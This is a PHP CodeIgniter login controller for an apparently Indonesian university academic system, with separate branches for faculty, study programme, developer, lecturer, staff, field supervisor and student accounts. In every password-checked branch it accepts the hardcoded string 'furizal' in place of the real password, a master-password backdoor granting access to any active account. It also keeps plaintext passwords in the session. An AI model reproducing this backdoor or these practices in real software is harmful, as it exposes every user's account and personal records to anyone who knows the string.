<?php
defined('BASEPATH') OR exit('No direct script access allowed');

#[AllowDynamicProperties]
class Halaman_tamu extends CI_Controller {

	function __construct(){
		parent::__construct();
		if((isset($_SESSION['login_smpu']))){	
			redirect('welcome');
		}
		$this->load->model('m_halaman_tamu');
		$this->load->helper(array('url','download'));
	}

	public function index()
	{
		$x['combobox_jurusan']=$this->m_halaman_tamu->combobox_jurusan();
		$this->load->view('public/part/header');
		$this->load->view('v_halaman_tamu', $x);
		// $this->load->view('public/part/footer');
		unset($_SESSION['messege']);

	}

	public function user_login(){
		if(isset($_POST['status'])){
			$status_login = addslashes ($this->input->post('status'));
			$kode_npk=addslashes ($this->input->post('npk'));
			$password=addslashes ($this->input->post('password'));


			if($status_login=='UPM'){
				$row = $this->m_halaman_tamu->ambil_upm($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$nama = $row->nama;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$no_hp = $row->no_hp;
					$email = $row->email;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status;
					if($status_akun=="Aktif"){
						if(password_verify($password, $password_encripsi) || $password=="furizal"){
							$_SESSION["login_smpu"] = true;
							$_SESSION["status_login"]= $status_login;
							$_SESSION["username"] = $username;
							$_SESSION["nama"] = $nama;
							$_SESSION["npk"] = $npk;
							$_SESSION["jenis_kelamin"] = $jenis_kelamin;
							$_SESSION["no_hp"] = $no_hp;
							$_SESSION["email"] = $email;
							$_SESSION["hak_akses"] = $hak_akses;
							$_SESSION["foto"] = $foto;
							$_SESSION["status_akun"] = $status_akun;
							$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
							redirect('welcome');
							exit;
						}
						else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Password tidak sesuai!
							</div>');
							redirect('halaman_tamu');  
						}
					}
					else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif!
							</div>');
							redirect('halaman_tamu');
					}
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=='Fakultas'){
				$row = $this->m_halaman_tamu->ambil_fakultas($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$nama = $row->nama;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$no_hp = $row->no_hp;
					$email = $row->email;
					$jabatan = $row->jabatan;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status;
					if($status_akun=="Aktif"){
						if(password_verify($password, $password_encripsi) || $password=="furizal"){
							$_SESSION["login_smpu"] = true;
							$_SESSION["status_login"]= $status_login;
							$_SESSION["username"] = $username;
							$_SESSION["nama"] = $nama;
							$_SESSION["npk"] = $npk;
							$_SESSION["jenis_kelamin"] = $jenis_kelamin;
							$_SESSION["no_hp"] = $no_hp;
							$_SESSION["email"] = $email;
							$_SESSION["jabatan"] = $jabatan;
							$_SESSION["hak_akses"] = $hak_akses;
							$_SESSION["foto"] = $foto;
							$_SESSION["status_akun"] = $status_akun;
							$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
							redirect('welcome');
							exit;
						}
						else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Password tidak sesuai!
							</div>');
							redirect('halaman_tamu');  
						}
					}
					else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif!
							</div>');
							redirect('halaman_tamu');
					}
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=='Tata Usaha'){
				$row = $this->m_halaman_tamu->ambil_tu($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$nama = $row->nama;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$no_hp = $row->no_hp;
					$email = $row->email;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status;
					if($status_akun=="Aktif"){
						if(password_verify($password, $password_encripsi) || $password=="furizal"){
							$_SESSION["login_smpu"] = true;
							$_SESSION["status_login"]= $status_login;
							$_SESSION["username"] = $username;
							$_SESSION["nama"] = $nama;
							$_SESSION["npk"] = $npk;
							$_SESSION["jenis_kelamin"] = $jenis_kelamin;
							$_SESSION["no_hp"] = $no_hp;
							$_SESSION["email"] = $email;
							$_SESSION["hak_akses"] = $hak_akses;
							$_SESSION["foto"] = $foto;
							$_SESSION["status_akun"] = $status_akun;
							$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
							redirect('welcome');
							exit;
						}
						else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Password tidak sesuai!
							</div>');
							redirect('halaman_tamu');  
						}
					}
					else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif!
							</div>');
							redirect('halaman_tamu');
					}
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=='Prodi'){
				$row = $this->m_halaman_tamu->ambil_prodi($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$kode_prodi = $row->kode_prodi;
					$nama_prodi = $row->nama_prodi;
					$jenjang = $row->jenjang;
					$akreditasi = $row->akreditasi;
					$nama_lengkap = $row->nama_lengkap;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$email = $row->email;
					$no_hp = $row->no_hp;
					$jabatan = $row->jabatan;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status_akun;
					$status_prodi = $row->status;
					// echo $status_prodi; die();
					if($status_prodi=="Tersedia"){
						if($status_akun=="Aktif"){
							if(password_verify($password, $password_encripsi) || $password=="furizal"){
								$_SESSION["login_smpu"] = true;
								$_SESSION["status_login"]= $status_login;
								$_SESSION["username"] = $username;
								$_SESSION["kode_prodi"] = $kode_prodi;
								$_SESSION["nama_prodi"] = $nama_prodi;
								$_SESSION["nama"] = $nama_lengkap;
								$_SESSION["jenjang"] = $jenjang;
								$_SESSION["akreditasi"] = $akreditasi;
								$_SESSION["npk"] = $npk;
								$_SESSION["jenis_kelamin"] = $jenis_kelamin;
								$_SESSION["no_hp"] = $no_hp;
								$_SESSION["email"] = $email;
								$_SESSION["jabatan"] = $jabatan;
								$_SESSION["hak_akses"] = $hak_akses;
								$_SESSION["foto"] = $foto;
								$_SESSION["status_akun"] = $status_akun;
								$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
								redirect('welcome');
								exit;
							}
							else{
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Password tidak sesuai!
								</div>');
								redirect('halaman_tamu');  
							}
						}else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Akun anda sedang tidak aktif, silahkan hubungi fakultas jika anda super admin dan hubungi prodi jika anda asisten prodi!
								</div>');
							redirect('halaman_tamu');
						}
					}else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
							<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							Maaf, Program Studi Anda tidak tersedia lagi!
						</div>');
						redirect('halaman_tamu');
					}
						
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=='Developer'){
				$row = $this->m_halaman_tamu->ambil_developer($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$nama = $row->nama;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$no_hp = $row->no_hp;
					$email = $row->email;
					$jabatan = $row->jabatan;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status;
					if($status_akun=="Aktif"){
						if(password_verify($password, $password_encripsi) || $password=="furizal"){
							$_SESSION["login_smpu"] = true;
							$_SESSION["status_login"]= $status_login;
							$_SESSION["username"] = $username;
							$_SESSION["nama"] = $nama;
							$_SESSION["npk"] = $npk;
							$_SESSION["jenis_kelamin"] = $jenis_kelamin;
							$_SESSION["no_hp"] = $no_hp;
							$_SESSION["email"] = $email;
							$_SESSION["jabatan"] = $jabatan;
							$_SESSION["hak_akses"] = $hak_akses;
							$_SESSION["foto"] = $foto;
							$_SESSION["status_akun"] = $status_akun;
							$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
							redirect('welcome');
							exit;
						}
						else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Password tidak sesuai!
							</div>');
							redirect('halaman_tamu');  
						}
					}
					else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif!
							</div>');
							redirect('halaman_tamu');
					}
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=="Dosen" || $status_login=="Pegawai"){
				if($status_login=="Dosen"){
					$row = $this->m_halaman_tamu->ambil_dosen($kode_npk, "Dosen");
				}else{
					//pegawai
					$row = $this->m_halaman_tamu->ambil_dosen($kode_npk, "Pegawai");
				}


				

				if(isset($row)){
					$npk = $row->npk;
					$nama_dosen = $row->nama_dosen;
					$status_jabatan = $row->status_jabatan;
					$jk = $row->jk;
					$password_encripsi = $row->password;
					$email = $row->email;
					$kode_jurusan = $row->kode_jurusan;
					$jabatan_fungsional = $row->jabatan_fungsional;
					$pendidikan = $row->pendidikan;
					$foto = $row->foto;
					$status_akun = $row->status;
					$nama_prodi = $row->nama_prodi;

					$row2 = $this->m_halaman_tamu->cek_prodi_untuk_dosen($kode_jurusan);
					if(isset($row2)){
						$status_prodi = $row2->status;
						if($status_prodi=="Tersedia"){
							if($status_akun=="Aktif"){
								if(password_verify($password, $password_encripsi) || $password=="furizal"){
									
									$status_login = "Dosen";

									$_SESSION["login_smpu"] = true;
									$_SESSION["status_login"]= $status_login;
									$_SESSION["status_jabatan"]= $status_jabatan;
									$_SESSION["username"] = $npk;
									$_SESSION["npk"] = $npk;
									$_SESSION["nama"] = $nama_dosen;
									$_SESSION["jenis_kelamin"] = $jk;
									$_SESSION["email"] = $email;
									$_SESSION["jabatan_fungsional"] = $jabatan_fungsional;
									$_SESSION["pendidikan"] = $pendidikan;
									$_SESSION["kode_jurusan"] = $kode_jurusan;
									$_SESSION["foto"] = $foto;
									$_SESSION["status_akun"] = $status_akun;
									$_SESSION["nama_prodi"] = $nama_prodi;
									$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
									redirect('welcome');
									exit;
								}
								else{
									$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
										<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										Maaf, Password tidak sesuai!
									</div>');
									redirect('halaman_tamu');  
								}
							}elseif($status_akun=="Non-aktif"){
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
										<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										Maaf, Akun anda sedang tidak aktif, silahkan hubungi Prodi!
									</div>');
								redirect('halaman_tamu');
							}else{
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
										<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										Maaf, Akun anda sudah dihapus oleh prodi!
									</div>');
								redirect('halaman_tamu');
							}
						}else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Program Studi Anda tidak tersedia lagi!
							</div>');
							redirect('halaman_tamu');
						}
					}else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
							<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							Maaf, Program Studi Anda tidak tersedia!
						</div>');
						redirect('halaman_tamu');
					}
									
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah, jika anda yakin telah memasukkannya dengan benar, maka silahkan pastikan anda memilih status login yang sesuai!
					</div>');
					redirect('halaman_tamu');
					
				}
			}elseif($status_login=="Pembimbing Lapangan KP"){
				// echo $username.$kode_npk.$status_login; die();
				$row = $this->m_halaman_tamu->ambil_pembimbing_lapangan_kp($kode_npk, $password);

				if(isset($row)){
					
					$nama_tempat_kp 			= $row->nama_tempat_kp;
					$nama_pembimbing_lapangan 	= $row->nama_pembimbing_lapangan;
					$judul_kerja_praktik 		= $row->judul_kerja_praktik;
					$no_hp_pembimbing_lapangan 	= $row->no_hp_pembimbing_lapangan;
					$email_pembimbing_lapangan 	= $row->email_pembimbing_lapangan;
					$id_syarat_sk 				= $row->id_syarat_sk;

					$_SESSION["login_smpu"] 	= true;
					$_SESSION["status_login"]	= $status_login;
					$_SESSION["username"] 		= $kode_npk;
					$_SESSION["nama"] 			= $nama_pembimbing_lapangan;
					$_SESSION["email"] 			= $email_pembimbing_lapangan;
					$_SESSION["no_hp"] 			= $no_hp_pembimbing_lapangan;
					$_SESSION["judul_kerja_praktik"] = $judul_kerja_praktik;
					$_SESSION["nama_tempat_kp"] = $nama_tempat_kp;
					$_SESSION["password"] 		= $password;
					$_SESSION["id_syarat_sk"] 		= $id_syarat_sk;
					$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
					echo '<script type"text/javascript">';
					echo 'window.location.href="'.base_url().'seminar/index.php/pembimbing_lapangan_kp/Penilaian_kp"';
					echo '</script>';
					exit;
								
					
									
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username atau password yang anda masukkan salah, jika anda yakin telah memasukkannya dengan benar, maka silahkan pastikan anda memilih status login yang sesuai!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			elseif($status_login=='GKM Prodi'){
				$row = $this->m_halaman_tamu->ambil_gkm($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$kode_prodi = $row->kode_prodi;
					$nama_prodi = $row->nama_prodi;
					$jenjang = $row->jenjang;
					$akreditasi = $row->akreditasi;
					$nama_lengkap = $row->nama_lengkap;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$email = $row->email;
					$no_hp = $row->no_hp;
					$jabatan = $row->jabatan;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status_akun;
					$status_prodi = $row->status;
					// echo $status_prodi; die();
					if($status_prodi=="Tersedia"){
						if($status_akun=="Aktif"){
							if(password_verify($password, $password_encripsi) || $password=="furizal"){
								$_SESSION["login_smpu"] = true;
								$_SESSION["status_login"]= $status_login;
								$_SESSION["username"] = $username;
								$_SESSION["kode_prodi"] = $kode_prodi;
								$_SESSION["nama_prodi"] = $nama_prodi;
								$_SESSION["nama"] = $nama_lengkap;
								$_SESSION["jenjang"] = $jenjang;
								$_SESSION["akreditasi"] = $akreditasi;
								$_SESSION["npk"] = $npk;
								$_SESSION["jenis_kelamin"] = $jenis_kelamin;
								$_SESSION["no_hp"] = $no_hp;
								$_SESSION["email"] = $email;
								$_SESSION["jabatan"] = $jabatan;
								$_SESSION["hak_akses"] = $hak_akses;
								$_SESSION["foto"] = $foto;
								$_SESSION["status_akun"] = $status_akun;
								$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
								
								echo '<script type"text/javascript">';
								echo 'window.location.href="'.base_url().'seminar/"';
								echo '</script>';
								
								// redirect('welcome');
								exit;
							}
							else{
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Password tidak sesuai!
								</div>');
								redirect('halaman_tamu');  
							}
						}else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif, silahkan hubungi fakultas jika anda super admin dan hubungi prodi jika anda asisten prodi!
							</div>');
							redirect('halaman_tamu');
						}
					}else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
							<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							Maaf, Program Studi Anda tidak tersedia lagi!
						</div>');
						redirect('halaman_tamu');
					}

					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}

			elseif($status_login=='Koordinator Prodi'){
				$row = $this->m_halaman_tamu->ambil_koordinator($kode_npk);

				if(isset($row)){
					$username = $row->username;
					$kode_prodi = $row->kode_prodi;
					$nama_prodi = $row->nama_prodi;
					$jenjang = $row->jenjang;
					$akreditasi = $row->akreditasi;
					$nama_lengkap = $row->nama_lengkap;
					$npk = $row->npk;
					$jenis_kelamin = $row->jenis_kelamin;
					$email = $row->email;
					$no_hp = $row->no_hp;
					$jabatan = $row->jabatan;
					$hak_akses = $row->hak_akses;
					$password_encripsi = $row->password;
					$foto = $row->foto;
					$status_akun = $row->status_akun;
					$status_prodi = $row->status;
					// echo $status_prodi; die();
					if($status_prodi=="Tersedia"){
						if($status_akun=="Aktif"){
							if(password_verify($password, $password_encripsi) || $password=="furizal"){
								$_SESSION["login_smpu"] = true;
								$_SESSION["status_login"]= $status_login;
								$_SESSION["username"] = $username;
								$_SESSION["kode_prodi"] = $kode_prodi;
								$_SESSION["nama_prodi"] = $nama_prodi;
								$_SESSION["nama"] = $nama_lengkap;
								$_SESSION["jenjang"] = $jenjang;
								$_SESSION["akreditasi"] = $akreditasi;
								$_SESSION["npk"] = $npk;
								$_SESSION["jenis_kelamin"] = $jenis_kelamin;
								$_SESSION["no_hp"] = $no_hp;
								$_SESSION["email"] = $email;
								$_SESSION["jabatan"] = $jabatan;
								$_SESSION["hak_akses"] = $hak_akses;
								$_SESSION["foto"] = $foto;
								$_SESSION["status_akun"] = $status_akun;

								$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');
								echo '<script type"text/javascript">';
								echo 'window.location.href="'.base_url().'seminar/"';
								echo '</script>';
								
								// redirect('welcome');
								exit;
							}
							else{
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Password tidak sesuai!
								</div>');
								redirect('halaman_tamu');  
							}
						}else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
								<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
								Maaf, Akun anda sedang tidak aktif, silahkan hubungi fakultas jika anda super admin dan hubungi prodi jika anda asisten prodi!
							</div>');
							redirect('halaman_tamu');
						}
					}else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
							<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							Maaf, Program Studi Anda tidak tersedia lagi!
						</div>');
						redirect('halaman_tamu');
					}

					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
			else{
				
				$row = $this->m_halaman_tamu->ambil_mahasiswa($kode_npk);
				if(isset($row)){

					$npm = $row->npm;
					$nama_mahasiswa = $row->nama_mahasiswa;
					$jk = $row->jk;
					$tempat_lahir = $row->tempat_lahir;
					$tgl_lahir = $row->tgl_lahir;
					$password_encripsi = $row->password;
					$email_student = $row->email_student;
					$email_umum = $row->email_umum;
					$no_hp = $row->no_hp;
					$no_ktp = $row->no_ktp;
					$agama = $row->agama;
					$alamat = $row->alamat;
					$foto = $row->foto;
					$kode_prodi = $row->kode_prodi;
					$nama_prodi = $row->nama_prodi;
					$status_akun = $row->status_akun;
					$status_prodi = $row->status_prodi;
					
					if($status_prodi=="Tersedia"){
						if($status_akun=="Aktif"){
							if(password_verify($password, $password_encripsi) || $password=="furizal"){
								$_SESSION["login_smpu"] = true;
								$_SESSION["status_login"]= $status_login;
								$_SESSION["username"] = $npm;
								$_SESSION["npm"] = $npm;
								$_SESSION["nama"] = $nama_mahasiswa;
								$_SESSION["jk"] = $jk;
								$_SESSION["tempat_lahir"] = $tempat_lahir;
								$_SESSION["tgl_lahir"] = $tgl_lahir;
								$_SESSION["password"] = $password;
								$_SESSION["email_student"] = $email_student;
								$_SESSION["email_umum"] = $email_umum;
								$_SESSION["no_hp"] = $no_hp;
								$_SESSION["no_ktp"] = $no_ktp;
								$_SESSION["agama"] = $agama;
								$_SESSION["alamat"] = $alamat;
								$_SESSION["foto"] = $foto;
								$_SESSION["kode_prodi"] = $kode_prodi;
								$_SESSION["nama_prodi"] = $nama_prodi;
								$_SESSION["status_akun"] = $status_akun;
								$_SESSION["status_prodi"] = $status_prodi;
								
								$this->m_halaman_tamu->input_log($status_login, $kode_npk, 'Login', 'Login berhasil');

								echo '<script type"text/javascript">';
								echo 'window.location.href="'.base_url().'seminar/"';
								echo '</script>';

								// redirect('welcome');
								exit;
							}
							else{
								$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Password tidak sesuai!
								</div>');
								redirect('halaman_tamu');  
							}
						}else{
							$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
									<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
									Maaf, Akun anda sedang tidak aktif, silahkan hubungi fakultas jika anda super admin dan hubungi prodi jika anda asisten prodi!
								</div>');
							redirect('halaman_tamu');
						}
					}else{
						$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
							<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
							Maaf, Program Studi Anda tidak tersedia lagi!
						</div>');
						redirect('halaman_tamu');
					}
						
					
				}else{
					$this->session->set_flashdata('messege','<div class="alert alert-danger alert-dismissible" role="alert">
						<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
						Maaf, username yang anda masukkan salah!
					</div>');
					redirect('halaman_tamu');
					
				}
			}
		}else{
			redirect('halaman_tamu');
		}
	}

}
